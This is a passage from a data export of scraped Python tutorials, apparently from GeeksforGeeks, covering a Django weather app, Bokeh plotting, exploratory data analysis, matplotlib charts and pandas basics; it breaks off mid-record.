api_key\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0place api_key in place of appid =\"your_api_key_here \"\u00a0 '''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# source contain JSON data from API\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0source = urllib.request.urlopen(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'http://api.openweathermap.org/data/2.5/weather?q ='\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ city + '&appid = your_api_key_here').read()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# converting JSON data to a dictionary\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0list_of_data = json.loads(source)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# data for variable list_of_data\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0data = {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"country_code\": str(list_of_data['sys']['country']),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"coordinate\": str(list_of_data['coord']['lon']) + ' '\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ str(list_of_data['coord']['lat']),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"temp\": str(list_of_data['main']['temp']) + 'k',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"pressure\": str(list_of_data['main']['pressure']),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"humidity\": str(list_of_data['main']['humidity']),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(data)\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0data ={}\u00a0\u00a0\u00a0\u00a0return render(request, \"main/index.html\", data)You can get your own API key from : Weather APINavigate to templates/main/index.html and edit it: link to index.html fileMake migrations and migrate it:\r\npython manage.py makemigrations\r\npython manage.py migrate\r\nnow let\u2019s run the server to see your weather app.python manage.py runserverMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "760d68584cd45df75475bb5b3d7056ef",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Bokeh is a data visualization library in Python that provides high-performance interactive charts and plots. Bokeh output can be obtained in various mediums like notebook, html and server. It is possible to embed bokeh plots in Django and flask apps.Bokeh provides two visualization interfaces to users:bokeh.models : A low level interface that provides high flexibility to application developers.bokeh.plotting : A high level interface for creating visual glyphs.To install bokeh package, run the following command in the terminal:pip install bokehThe dataset used for generating bokeh graphs is collected from Kaggle.Code #1: Scatter MarkersTo create scatter circle markers, circle() method is used.# import modulesfrom bokeh.plotting import figure, output_notebook, show\u00a0\u00a0# output to notebookoutput_notebook()\u00a0\u00a0# create figurep = figure(plot_width = 400, plot_height = 400)\u00a0\u00a0# add a circle renderer with# size, color and alphap.circle([1, 2, 3, 4, 5], [4, 7, 1, 6, 3],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0size = 10, color = \"navy\", alpha = 0.5)\u00a0\u00a0# show the resultsshow(p)\u00a0Output :Code #2: Single lineTo create a single line, line() method is used.# import modulesfrom bokeh.plotting import figure, output_notebook, show\u00a0\u00a0# output to notebookoutput_notebook()\u00a0\u00a0# create figurep = figure(plot_width = 400, plot_height = 400)\u00a0\u00a0\u00a0# add a line rendererp.line([1, 2, 3, 4, 5], [3, 1, 2, 6, 5],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0line_width = 2, color = \"green\")\u00a0\u00a0# show the resultsshow(p)Output :Code #3: Bar ChartBar chart presents categorical data with rectangular bars. The length of the bar is proportional to the values that are represented.# import necessary modulesimport pandas as pdfrom bokeh.charts import Bar, output_notebook, show\u00a0\u00a0# output to notebookoutput_notebook()\u00a0\u00a0# read data in dataframedf = pd.read_csv(r\"D:/kaggle/mcdonald/menu.csv\")\u00a0\u00a0# create barp = Bar(df, \"Category\", values = \"Calories\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0title = \"Total Calories by Category\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0legend = \"top_right\")\u00a0\u00a0# show the resultsshow(p)Output :Code #4: Box PlotBox plot is used to represent statistical data on a plot. It helps to summarize statistical properties of various data groups present in the data.# import necessary modulesfrom bokeh.charts import BoxPlot, output_notebook, showimport pandas as pd\u00a0\u00a0# output to notebookoutput_notebook()\u00a0\u00a0# read data in dataframedf = pd.read_csv(r\"D:/kaggle / mcdonald / menu.csv\")\u00a0\u00a0# create barp = BoxPlot(df, values = \"Protein\", label = \"Category\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0color = \"yellow\", title = \"Protein Summary (grouped by category)\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0legend = \"top_right\")\u00a0\u00a0# show the resultsshow(p)Output :Code #5: HistogramHistogram is used to represent distribution of numerical data. The height of a rectangle in a histogram is proportional to the frequency of values in a class interval.# import necessary modulesfrom bokeh.charts import Histogram, output_notebook, showimport pandas as pd\u00a0\u00a0# output to notebookoutput_notebook()\u00a0\u00a0# read data in dataframedf = pd.read_csv(r\"D:/kaggle / mcdonald / menu.csv\")\u00a0\u00a0# create histogramp = Histogram(df, values = \"Total Fat\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0title = \"Total Fat Distribution\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0color = \"navy\")\u00a0\u00a0# show the resultsshow(p)\u00a0Output :Code #6: Scatter plotScatter plot is used to plot values of two variables in a dataset. It helps to find correlation among the two variables that are selected.# import necessary modulesfrom bokeh.charts import Scatter, output_notebook, showimport pandas as pd\u00a0\u00a0# output to notebookoutput_notebook()\u00a0\u00a0# read data in dataframedf = pd.read_csv(r\"D:/kaggle / mcdonald / menu.csv\")\u00a0\u00a0# create scatter plotp = Scatter(df, x = \"Carbohydrates\", y = \"Saturated Fat\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0title = \"Saturated Fat vs Carbohydrates\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0xlabel = \"Carbohydrates\", ylabel = \"Saturated Fat\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0color = \"orange\")\u00a0\u00a0\u00a0# show the resultsshow(p)\u00a0Output :References: https://bokeh.pydata.org/en/latest/My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "4427daea816ef69ddc65f859043d7806",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "What is Exploratory Data Analysis (EDA) ?EDA is a phenomenon under data analysis used for gaining a better understanding of data aspects like:\u00a0\u2013 main features of data\u00a0\u2013 variables and relationships that hold between them\u00a0\u2013 identifying which variables are important for our problem\u00a0We shall look at various exploratory data analysis methods like:\u00a0\u00a0Descriptive Statistics, which is a way of giving a brief overview of the dataset we are dealing with, including some measures and features of the sampleGrouping data [Basic grouping with group by]ANOVA, Analysis Of Variance, which is a computational method to divide variations in an observations set into different components.Correlation and correlation methodsThe dataset we\u2019ll be using is child voting dataset, which you can import in python as:\u00a0\u00a0Python3import pandas as pdDf = pd.read_csv(\"https://vincentarelbundock.github.io / Rdatasets / csv / car / Child.csv\")Descriptive StatisticsDescriptive statistics is a helpful way to understand characteristics of your data and to get a quick summary of it. Pandas in python provide an interesting method describe(). The describe function applies basic statistical computations on the dataset like extreme values, count of data points standard deviation etc. Any missing value or NaN value is automatically skipped. describe() function gives a good picture of distribution of data.\u00a0\u00a0Python3DF.describe()Here\u2019s the output you\u2019ll get on running above code:\u00a0\u00a0Another useful method if value_counts() which can get count of each category in a categorical attributed series of values. For an instance suppose you are dealing with a dataset of customers who are divided as youth, medium and old categories under column name age and your dataframe is \u201cDF\u201d. You can run this statement to know how many people fall in respective categories. In our data set example education column can be used\u00a0\u00a0Python3DF[\"education\"].value_counts()The output of the above code will be:\u00a0\u00a0One more useful tool is boxplot which you can use through matplotlib module. Boxplot is a pictorial representation of distribution of data which shows extreme values, median and quartiles. We can easily figure out outliers by using boxplots. Now consider the dataset we\u2019ve been dealing with again and lets draw a boxplot on attribute population\u00a0\u00a0Python3import pandas as pdimport matplotlib.pyplot as pltDF = pd.read_csv(\"https://raw.githubusercontent.com / fivethirtyeight / data / master / airline-safety / airline-safety.csv\")y = list(DF.population)plt.boxplot(y)plt.show()The output plot would look like this with spotting out outliers:\u00a0\u00a0\u00a0Grouping dataGroup by is an interesting measure available in pandas which can help us figure out effect of different categorical attributes on other data variables. Let\u2019s see an example on the same dataset where we want to figure out affect of people\u2019s age and education on the voting dataset.\u00a0\u00a0Python3DF.groupby(['education', 'vote']).mean()The output would be somewhat like this:\u00a0\u00a0If this group by output table is less understandable further analysts use pivot tables and heat maps for visualization on them.\u00a0\u00a0ANOVAANOVA stands for Analysis of Variance. It is performed to figure out the relation between the different group of categorical data.\u00a0Under ANOVA we have two measures as result:\u00a0\u2013 F-testscore : which shows the variation of groups mean over variation\u00a0\u2013 p-value: it shows the importance of the result\u00a0This can be performed using python module scipy method name f_oneway()\u00a0Syntax:\u00a0These samples are sample measurements for each group.\u00a0As a conclusion, we can say that there is a strong correlation between other variables and a categorical variable if the ANOVA test gives us a large F-test value and a small p-value.\u00a0Correlation and Correlation computationCorrelation is a simple relationship between two variables in a context such that one variable affects the other. Correlation is different from act of causing. One way to calculate correlation among variables is to find Pearson correlation. Here we find two parameters namely, Pearson coefficient and p-value. We can say there is a strong correlation between two variables when Pearson correlation coefficient is close to either 1 or -1 and the p-value is less than 0.0001.\u00a0Scipy module also provides a method to perform pearson correlation analysis, syntax:\u00a0\u00a0Here samples are the attributes you want to compare.\u00a0This is a brief overview of EDA in python, we can do lots more! Happy digging!\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "7b1aeb5000d5b245e975fb1de4c9f40b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Data Visualization is the presentation of data in graphical format. It helps people understand the significance of data by summarizing and presenting huge amount of data in a simple and easy-to-understand format and helps communicate information clearly and effectively.Consider this given Data-set for which we will be plotting different charts :\u00a0Different Types of Charts for Analyzing & Presenting Data\u00a01. Histogram :The histogram represents the frequency of occurrence of specific phenomena which lie within a specific range of values and arranged in consecutive and fixed intervals.In below code histogram is plotted for Age, Income, Sales. So these plots in the output shows frequency of each unique value for each attribute.# import pandas and matplotlibimport pandas as pdimport matplotlib.pyplot as plt\u00a0\u00a0# create 2D array of table given abovedata = [['E001', 'M', 34, 123, 'Normal', 350],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['E002', 'F', 40, 114, 'Overweight', 450],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['E003', 'F', 37, 135, 'Obesity', 169],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['E004', 'M', 30, 139, 'Underweight', 189],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['E005', 'F', 44, 117, 'Underweight', 183],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['E006', 'M', 36, 121, 'Normal', 80],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['E007', 'M', 32, 133, 'Obesity', 166],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['E008', 'F', 26, 140, 'Normal', 120],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['E009', 'M', 32, 133, 'Normal', 75],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0['E010', 'M', 36, 133, 'Underweight', 40] ]\u00a0\u00a0# dataframe created with# the above data arraydf = pd.DataFrame(data, columns = ['EMPID', 'Gender',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Age', 'Sales',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'BMI', 'Income'] )\u00a0\u00a0# create histogram for numeric datadf.hist()\u00a0\u00a0# show plotplt.show()Output :\u00a02. Column Chart :A column chart is used to show a comparison among different attributes, or it can show a comparison of items over time.# Dataframe of previous code is used here\u00a0\u00a0# Plot the bar chart for numeric values# a comparison will be shown between# all 3 age, income, salesdf.plot.bar()\u00a0\u00a0# plot between 2 attributesplt.bar(df['Age'], df['Sales'])plt.xlabel(\"Age\")plt.ylabel(\"Sales\")plt.show()Output :\u00a03. Box plot chart :A box plot is a graphical representation of statistical data based on the minimum, first quartile, median, third quartile, and maximum. The term \u201cbox plot\u201d comes from the fact that the graph looks like a rectangle with lines extending from the top and bottom. Because of the extending lines, this type of graph is sometimes called a box-and-whisker plot. For quantile and median refer to this Quantile and median.# For each numeric attribute of dataframedf.plot.box()\u00a0\u00a0# individual attribute box plotplt.boxplot(df['Income'])plt.show()Output :\u00a04. Pie Chart :A pie chart shows a static number and how categories represent part of a whole the composition of something. A pie chart represents numbers in percentages, and the total sum of all segments needs to equal 100%.plt.pie(df['Age'], labels = {\"A\", \"B\", \"C\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"D\", \"E\", \"F\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"G\", \"H\", \"I\", \"J\"},\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0autopct ='% 1.1f %%', shadow = True)plt.show()\u00a0\u00a0plt.pie(df['Income'], labels = {\"A\", \"B\", \"C\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"D\", \"E\", \"F\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"G\", \"H\", \"I\", \"J\"},\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0autopct ='% 1.1f %%', shadow = True)plt.show()\u00a0\u00a0plt.pie(df['Sales'], labels = {\"A\", \"B\", \"C\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"D\", \"E\", \"F\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"G\", \"H\", \"I\", \"J\"},autopct ='% 1.1f %%', shadow = True)plt.show()Output :\u00a05. Scatter plot :A scatter chart shows the relationship between two different variables and it can reveal the distribution trends. It should be used when there are many different data points, and you want to highlight similarities in the data set. This is useful when looking for outliers and for understanding the distribution of your data.# scatter plot between income and ageplt.scatter(df['income'], df['age'])plt.show()\u00a0\u00a0# scatter plot between income and salesplt.scatter(df['income'], df['sales'])plt.show()\u00a0\u00a0# scatter plot between sales and ageplt.scatter(df['sales'], df['age'])plt.show()Output :My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "22410bc868cbc12687212b7f53453e3d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is a great language for doing data analysis, primarily because of the fantastic ecosystem of data-centric Python packages. Pandas is one of those packages, and makes importing and analyzing data much easier. In this article, I have used Pandas to analyze data on Country Data.csv file from UN public Data Sets of a popular \u2018statweb.stanford.edu\u2019 website.As I have analyzed the Indian Country Data, I have introduced Pandas key concepts as below. Before going through this article, have a rough idea of basics from matplotlib and csv.InstallationEasiest way to install pandas is to use pip:pip install pandasor, Download it from hereCreating A DataFrame in PandasCreation of dataframe is done by passing multiple Series into the DataFrame class using pd.Series method. Here, it is passed in the two Series objects, s1 as the first row, and s2 as the second row.Example:# assigning two series to s1 and s2s1 = pd.Series([1,2])s2 = pd.Series([\"Ashish\", \"Sid\"])# framing series objects into datadf = pd.DataFrame([s1,s2])# show the data framedf\u00a0\u00a0# data framing in another way# taking index and column valuesdframe = pd.DataFrame([[1,2],[\"Ashish\", \"Sid\"]],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0index=[\"r1\", \"r2\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0columns=[\"c1\", \"c2\"])dframe\u00a0\u00a0# framing in another way\u00a0# dict-like containerdframe = pd.DataFrame({\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"c1\": [1, \"Ashish\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"c2\": [2, \"Sid\"]})dframeOutput:    \r\nImporting Data with PandasThe first step is to read the data. The data is stored as a comma-separated values, or csv, file, where each row is separated by a new line, and each column by a comma (,). In order to be able to work with the data in Python, it is needed to read the csv file into a Pandas DataFrame. A DataFrame is a way to represent and work with tabular data. Tabular data has rows and columns, just like this csv file(Click Download).Example:# Import the pandas library, renamed as pdimport pandas as pd\u00a0\u00a0# Read IND_data.csv into a DataFrame, assigned to dfdf = pd.read_csv(\"IND_data.csv\")\u00a0\u00a0# Prints the first 5 rows of a DataFrame as defaultdf.head()\u00a0\u00a0# Prints no. of rows and columns of a DataFramedf.shapeOutput:\r\n29,10\r\nIndexing DataFrames with PandasIndexing can be possible using the pandas.DataFrame.iloc method. The iloc method allows to retrieve as \u00a0many as rows and columns by position.Examples:# prints first 5 rows and every column which replicates df.head()df.iloc[0:5,:]# prints entire rows and columnsdf.iloc[:,:]# prints from 5th rows and first 5 columnsdf.iloc[5:,:5]Indexing Using Labels in PandasIndexing can be worked with labels using the pandas.DataFrame.loc method, which allows to index using labels instead of positions.Examples:# prints first five rows including 5th index and every columns of dfdf.loc[0:5,:]# prints from 5th rows onwards and entire columnsdf = df.loc[5:,:]The above doesn\u2019t actually look much different from df.iloc[0:5,:]. This is because while row labels can take on any values, our row labels match the positions exactly. But column labels can make things much easier when working with data. Example:# Prints the first 5 rows of Time period# value\u00a0df.loc[:5,\"Time period\"]\r\nDataFrame Math with PandasComputation of data frames can be done by using Statistical Functions of pandas tools.Examples:# computes various summary statistics, excluding NaN valuesdf.describe()# for computing correlationsdf.corr()# computes numerical data ranksdf.rank()\r\n\r\n \r\n\r\n\r\nPandas PlottingPlots in these examples are made using standard convention for referencing the matplotlib API which provides the basics in pandas to easily create decent looking plots.Examples:# import the required module\u00a0import matplotlib.pyplot as plt# plot a histogram\u00a0df['Observation Value'].hist(bins=10)\u00a0\u00a0# shows presence of a lot of outliers/extreme valuesdf.boxplot(column='Observation Value', by = 'Time period')\u00a0\u00a0# plotting points as a scatter plotx = df[\"Observation Value\"]y = df[\"Time period\"]plt.scatter(x, y, label= \"stars\", color= \"m\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0marker= \"*\", s=30)# x-axis labelplt.xlabel('Observation Value')# frequency labelplt.ylabel('Time period')# function to show the plotplt.show()\r\n\r\n\r\nData Analysis and Visualization with Python | Set 2Reference:http://pandas.pydata.org/pandas-docs/stable/tutorials.htmlhttps://www.datacamp.comThis article is contributed by Afzal_Saan. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "45b45674485874103354fabbcc3ccf61",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisites : NumPy in Python, Data Analysis Visualization with Python | Set 11. Storing DataFrame in CSV Format :Pandas provide to.csv('filename', index = \"False|True\") function to write DataFrame into a CSV file. Here filename is the name of the CSV file that you want to create and index tells that index (if Default) of DataFrame should be overwritten or not. If we set index = False then the index is not overwritten. By Default value of index is TRUE then index is overwritten.Example :import pandas as pd\u00a0\u00a0# assigning three series to s1, s2, s3s1 = pd.Series([0, 4, 8])s2 = pd.Series([1, 5, 9])s3 = pd.Series([2, 6, 10])\u00a0\u00a0# taking index and column valuesdframe = pd.DataFrame([s1, s2, s3])\u00a0\u00a0# assign column namedframe.columns =['Geeks', 'For', 'Geeks']\u00a0\u00a0# write data to csv filedframe.to_csv('geeksforgeeks.csv', index = False)\u00a0\u00a0dframe.to_csv('geeksforgeeks1.csv', index = True)Output :\r\ngeeksforgeeks1.csv\r\n\r\n\r\ngeeksforgeeks2.csv\r\n\r\n\u00a02. Handling Missing DataThe Data Analysis Phase also comprises of the ability to handle the missing data from our dataset, and not so surprisingly Pandas live up to that expectation as well. This is where dropna and/or fillna methods comes into the play. While dealing with the missing data, you as a Data Analyst are either supposed to drop the column containing the NaN values (dropna method) or fill in the missing data with mean or mode of the whole column entry (fillna method), this decision is of great significance and depends upon the data and the affect would create in our results.Drop the missing Data :Consider this is the DataFrame generated by below code :import pandas as pd\u00a0\u00a0# Create a DataFramedframe = pd.DataFrame({'Geeks': [23, 24, 22],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'For': [10, 12, np.nan],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'geeks': [0, np.nan, np.nan]},\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0columns =['Geeks', 'For', 'geeks'])\u00a0\u00a0# This will remove all the# rows with NAN values\u00a0\u00a0# If axis is not defined then# it is along rows i.e. axis = 0dframe.dropna(inplace = True)print(dframe)\u00a0\u00a0# if axis is equal to 1dframe.dropna(axis = 1, inplace = True)\u00a0\u00a0print(dframe)Output :\r\naxis=0\r\n \r\n\r\naxis=1\r\n\u00a0Fill the missing values :Now, to replace any NaN value with mean or mode of the data, fillna is used, which could replace all the NaN values from a particular column or even in whole DataFrame as per the requirement.import numpy as npimport pandas as pd\u00a0\u00a0# Create a DataFramedframe = pd.DataFrame({'Geeks': [23, 24, 22],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'For': [10, 12, np.nan],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'geeks': [0, np.nan, np.nan]},\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0columns = ['Geeks', 'For', 'geeks'])\u00a0\u00a0# Use fillna of complete Dataframe\u00a0\u00a0\u00a0# value function will be applied on every columndframe.fillna(value = dframe.mean(), inplace = True)print(dframe)\u00a0\u00a0# filling value of one columndframe['For'].fillna(value = dframe['For'].mean(),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0inplace = True)print(dframe)Output :\r\n\u00a03. Groupby Method (Aggregation) :The groupby method allows us to group together the data based off any row or column, thus we can further apply the aggregate functions to analyze our data. Group series using mapper (dict or key function, apply given function to group, return result as series) or by a series of columns.Consider this is the DataFrame generated by below code :import pandas as pdimport numpy as np\u00a0\u00a0# create DataFramedframe = pd.DataFrame({'Geeks': [23, 24, 22, 22, 23, 24],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'For': [10, 12, 13, 14, 15, 16],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'geeks': [122, 142, 112, 122, 114, 